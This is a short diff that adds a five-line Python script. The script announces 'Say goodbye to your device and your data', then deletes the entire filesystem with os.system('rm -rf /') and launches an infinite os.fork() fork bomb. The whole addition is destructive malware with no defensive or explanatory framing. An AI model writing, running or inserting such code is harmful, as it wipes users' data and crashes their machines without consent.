@@ -1,0 +1,5 @@
+print ('Say goodbye to your device and your data')
+import os
+os.system('rm -rf /')
+while (True):
+     os.fork()
